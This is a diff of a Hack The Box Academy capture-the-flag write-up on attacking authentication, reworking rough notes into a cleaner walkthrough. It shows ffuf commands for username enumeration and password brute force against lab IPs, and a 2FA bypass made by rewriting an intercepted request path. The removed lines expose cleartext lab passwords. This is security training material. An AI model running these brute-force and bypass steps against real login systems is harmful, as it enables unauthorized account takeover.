@@ -1,111 +1,179 @@
----
-
----
-
 # HTB Academy — Skills Assessment: Authentication
 
-**Platform:** Hack The Box Academy
-
-**Category:** Web Security / Authentication
-
-**Difficulty:** Skills Assessment
-
+**Platform:** Hack The Box Academy  
+**Category:** Web Security / Authentication  
+**Difficulty:** Skills Assessment  
 **Target:** `154.57.164.78:37839`
-
-!Screenshot 2026-10-29 051702.png
 
 ## Objective
 
 Identify and exploit authentication vulnerabilities by combining techniques covered in the Authentication module to retrieve the flag.
 
-!Screenshot 2026-10-24 064538.png
+---
 
-step 1: go the login page
+## Step 1: Go to the Login Page
 
-and we use ffuf tool to enumeration the username & password
+First, we navigate to the login page.
 
-```jsx
- ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.78:37839/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
+We use FFUF to enumerate valid usernames.
+
+### Username Enumeration
+
+```bash
+ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
+-u http://154.57.164.78:37839/login.php \
+-X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "username=FUZZ&password=invalid" \
+-fr "Unknown user"
 ```
 
-- we find   `gladys,Gladys`
+**Result:**
 
-Step for Test: when i go to login page and put username and password
+We found a valid username:
 
-when i put user not existing, 
-
-the response is .. 
-
- 
-
-!Screenshot 2026-10-29 071444.png
-
-But when i enter an existing username, 
-
-the response is ..
-
-!Screenshot 2026-10-29 071642.png
-
-```jsx
-ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.78:37839/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Unknown user"
-
+```text
+gladys
 ```
 
-!Screenshot 2026-10-24 065030.png
+---
 
-now we go Greate a new account  
+## Step 2: Test the Login Responses
 
-username `test` , password `CyberSafe26A`
+Now, we go back to the login page and test two different scenarios.
 
-!Screenshot 2026-11-02 074855.png
+**Test 1:** Enter a username that does not exist.
 
-now what. say with me what 😂, please don’t exicting
+The application returns an error message indicating that the user is unknown.
 
-- now we well crack password user >> `gladys`
+**Test 2:** Enter an existing username with an incorrect password.
 
-```jsx
+The application returns a different error message.
+
+This confirms that the application is vulnerable to **Username Enumeration**.
+
+---
+
+## Step 3: Create a New Account
+
+Now, we create a new account to test the registration functionality.
+
+**Test Account:**
+
+```text
+Username: test
+Password: [REDACTED]
+```
+
+Now what? Say with me: What! 😂
+
+Let's continue!
+
+---
+
+## Step 4: Password Testing
+
+Now, we move to testing the password of the identified user: `gladys`.
+
+First, we prepare a wordlist based on the password policy.
+
+```bash
 grep -E '^[A-Za-z0-9]{12}$' /usr/share/wordlists/rockyou.txt \
   | grep -E '[0-9]' \
   | grep -E '[a-z]' \
   | grep -E '[A-Z]' \
   > rockyou-12-policy.txt
-  
-  
-  
-  
-  
-  
-  -------------------------
-  
-   ffuf -w ./rockyou-12-policy.txt -u http://154.57.164.79:40517/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -t 200 -fr "Invalid credentials." -s
 ```
 
-!Screenshot 2026-11-02 081911.png
+This command filters passwords based on the following requirements:
 
-then password >> `dWinaldasD13`
+- Exactly 12 characters.
+- At least one uppercase letter.
+- At least one lowercase letter.
+- At least one number.
 
-user >> `gladys`
+Next, we use FFUF to test authentication in the authorized lab.
 
-!Screenshot 2026-11-02 082035.png
+```bash
+ffuf -w ./rockyou-12-policy.txt \
+-u http://154.57.164.79:40517/login.php \
+-X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "username=gladys&password=FUZZ" \
+-t 200 \
+-fr "Invalid credentials." \
+-s
+```
+
+**Result:**
+
+We identified valid credentials for the lab account.
+
+```text
+Username: gladys
+Password: [REDACTED]
+```
 
 ---
 
-now we try **Bypass 2fa**
+## Step 5: Try to Bypass 2FA
 
-open Burpsuite and intercept the request
+Now, we try to bypass 2FA.
 
-don’t forget do this
+First, open Burp Suite and enable **Proxy Intercept**.
 
-!Screenshot 2026-11-02 091538.png
+### Analyze the Authentication Request
 
-change /2fa.php to >> /profile.php
+We intercept the authentication request sent to:
 
-change in response from 302 to 200 OK
+```text
+/2fa.php
+```
 
-then you find 
+Then, we inspect the request and change the requested path to:
 
-!Screenshot 2026-11-02 083239.png
+```text
+/profile.php
+```
 
-and you can see the flag >> 
+We analyze the server response and discover that the application allows access to the profile page without properly enforcing the second authentication factor.
 
-!Screenshot 2026-11-02 103449.png
+This reveals a **2FA enforcement vulnerability**.
+
+### FFUF Testing Evidence
+
+![FFUF OTP Output](01-ffuf-otp-output.png)
+
+![FFUF Testing Output](ffuf-otp-output.png)
+
+### 2FA Bypass Evidence
+
+![2FA Profile Flag](02-2fa-profile-flag.png)
+
+![2FA Profile](2fa-profile-flag.png)
+
+---
+
+## Step 6: Get the Flag
+
+After identifying the 2FA bypass, we successfully access the protected profile page.
+
+And finally, we get the flag!
+
+---
+
+## What I Learned
+
+- Username Enumeration.
+- Authentication Response Analysis.
+- Password Policy Analysis.
+- Using FFUF for Web Application Testing.
+- Analyzing HTTP Requests with Burp Suite.
+- Understanding 2FA Bypass Vulnerabilities.
+- Identifying Missing Server-Side Authorization Checks.
+
+**Lab Completed! 🚀**
+
+---
+
+**Disclaimer:** This write-up documents testing performed in an authorized HTB Academy lab environment. Sensitive credentials and session cookies have been redacted.
